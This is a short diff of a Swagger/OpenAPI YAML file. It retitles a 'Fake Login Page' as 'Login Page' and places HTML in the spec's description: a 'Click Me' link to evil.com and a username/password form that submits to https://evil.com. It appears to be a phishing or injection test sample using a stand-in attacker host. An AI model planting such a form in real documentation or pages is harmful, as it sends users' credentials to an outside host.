@@ -1,9 +1,9 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
-  description: |
-    <div class="form-container">
+  title: Login Page
+  description: <a href="https://www.evil.com">Click Me</a>">
+<div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
           <label for="username">Username</label>
@@ -30,13 +30,3 @@ paths:
       responses:
         '200':
           description: Login successful
-
-
-
-
-
-
-
-
-
-  
